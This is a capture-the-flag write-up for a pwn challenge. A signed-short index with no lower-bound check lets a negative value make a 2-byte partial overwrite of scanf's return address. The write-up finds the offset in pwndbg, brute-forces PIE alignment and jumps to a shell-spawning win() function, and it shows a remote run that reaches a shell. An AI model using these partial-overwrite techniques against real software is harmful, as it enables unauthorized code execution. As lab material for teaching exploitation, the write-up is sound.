---
title: 'short-writer'
description: 'Can you overwrite the return address with just a short write?'
date: 2026-01-26
tags: ['pwn', 'oob', 'partial-overwrite']
authors: ['w6rst']
order: 0
---

import { Code } from 'astro-expressive-code/components'
import Challenge from '@/components/mdx/Challenge.astro'
import Callout from '@/components/mdx/Callout.astro'
import checksec from './assets/checksec.txt?raw'
import main_c from './assets/main.c?raw'
import exploit from './assets/exploit.py?raw'

## short-writer

<Challenge
  category="pwn"
  files={['chal', 'main.c', 'Dockerfile', 'exploit.py']}
  description="Can you overwrite the return address with just a short write?"
/>

## Program Analysis

The program is straightforward. It contains a `win(){:c}` function that spawns a shell.

```c
void win() {
    execve("/bin/sh", NULL, NULL);
}
```

In `main(){:c}`, we see the core logic:

<Code code={main_c} lang="c" />

The program does three simple things:
1.  Asks for a position (`pos`).
2.  Checks if `pos >= 100`.
3.  Asks for a value and writes it to `shorts[pos]`.

The vulnerability is obvious: the `pos` check only verifies the upper bound. Since `pos` is a `short` (signed 16-bit integer), we can provide a **negative value** to index before the `shorts` array on the stack.

Looking at the disassembly of `main`, we can see the stack layout:

```text
127b:  lea    rax,[rbp-0xd2]        # pos address
12da:  lea    rax,[rbp-0xd0]        # shorts address
```

- `pos` is at `rbp-0xd2`.
- `shorts[0]` is at `rbp-0xd0`.

Since each `short` is 2 bytes, we can calculate the address of `shorts[pos]` as `(rbp-0xd0) + (pos * 2)`.

Now that we know the bug, let’s move to the exploitation part.

Starting with a basic check of the binary's protections:

<Code code={checksec} lang="ansi" />

The binary has all protections enabled: **Full RELRO**, **Canary**, **NX**, and **PIE**.

## Exploitation

For this challenge, I first turned off aslr for easier debugging:

```bash
❯ aslr_off
0
```
or

```bash
❯ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
```

Since PIE is enabled, the only viable spot to exploit is the `__isoc99_scanf(){:c}` return address, which normally returns to `main+***`.

### Debugging with Pwndbg

Breaking at `*__isoc99_scanf+201` (the `ret` instruction):

```bash
pwndbg>
────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────
 ► 0x7ffff7c5fed9 <__isoc99_scanf+201>    ret                                <main+140>
    ↓
   0x555555555299 <main+140>              movzx  eax, word ptr [rbp - 0xd2]     EAX, [0x7fffffffe12e] => 0xfff4
   0x5555555552a0 <main+147>              cmp    ax, 0x63                       0xfff4 - 0x63     EFLAGS => 0x282 [ cf pf af zf SF IF df of ac ]
   0x5555555552a4 <main+151>            ✔ jle    main+175                    <main+175>
    ↓
   0x5555555552bc <main+175>              lea    rax, [rip + 0xd65]             RAX => 0x555555556028 ◂— 0x203e206c6176 /* 'val > ' */
   0x5555555552c3 <main+182>              mov    rdi, rax                       RDI => 0x555555556028 ◂— 0x203e206c6176 /* 'val > ' */
   0x5555555552c6 <main+185>              mov    eax, 0                         EAX => 0
   0x5555555552cb <main+190>              call   printf@plt                  <printf@plt>

   0x5555555552d0 <main+195>              movzx  eax, word ptr [rbp - 0xd2]
   0x5555555552d7 <main+202>              movsx  edx, ax
   0x5555555552da <main+205>              lea    rax, [rbp - 0xd0]
──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
00:0000│ rsp 0x7fffffffe118 —▸ 0x555555555299 (main+140) ◂— movzx eax, word ptr [rbp - 0xd2]
01:0008│-0e0 0x7fffffffe120 ◂— 0x14
02:0010│-0d8 0x7fffffffe128 ◂— 0xfff4000000000040 /* '@' */
03:0018│-0d0 0x7fffffffe130 ◂— 0x800000
04:0020│-0c8 0x7fffffffe138 ◂— 8
05:0028│-0c0 0x7fffffffe140 ◂— 0xffffffffffffffff
06:0030│-0b8 0x7fffffffe148 ◂— 0x40 /* '@' */
07:0038│-0b0 0x7fffffffe150 ◂— 0xc /* '\x0c' */
────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────

```
The stack at `0x7fffffffe118` contains the address of `main+140`. To overwrite this, we need to find the distance from our `shorts` array.

Breaking at the second `scanf(){:c}` (`*main+239`):

```bash
pwndbg> 
────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────
 ► 0x5555555552fc <main+239>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
        format: 0x555555556013 ◂— 0x27756f5900646825 /* '%hd' */
        rsi: 0x7fffffffe130 ◂— 0x800000

   0x555555555301 <main+244>    mov    eax, 0                       EAX => 0
   0x555555555306 <main+249>    mov    rdx, qword ptr [rbp - 8]
   0x55555555530a <main+253>    sub    rdx, qword ptr fs:[0x28]
   0x555555555313 <main+262>    je     main+269                    <main+269>

   0x555555555315 <main+264>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>

   0x55555555531a <main+269>    leave
b+ 0x55555555531b <main+270>    ret

   0x55555555531c <_fini>       endbr64
   0x555555555320 <_fini+4>     sub    rsp, 8
   0x555555555324 <_fini+8>     add    rsp, 8
─────────────────────────────────────────────────────────────────────────────────────────────
```

- `shorts[0]` is at `0x7fffffffe130`.
- Target return address is at `0x7fffffffe118`.

Calculating the offset:

```bash
pwndbg> p 0x7fffffffe130 - 0x7fffffffe118
$1 = 24
```

The difference is **24 bytes**. Since we index by `short` (2 bytes), the required index is:
`pos = -24 / 2 = -12`.

By providing `-12` as our `pos`, we can overwrite the last 2 bytes of the saved instruction pointer `main+140`. By changing these to the last 2 bytes of the `win(){:c}` function, `scanf(){:c}` will return directly into `win(){:c}` when it finishing reading our value.

<Callout type="warning">
  Since PIE is enabled, we need to run this multiple times until the base address aligns such that our 2-byte overwrite correctly points to `win`.
</Callout>

### Exploit Script

<Code code={exploit} lang="python" />

Running the exploit:

```bash
python3 exploit.py REMOTE <ip> <port>
[+] Opening connection to <ip> on port <port>: Done
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
```

Another daily challenge down!
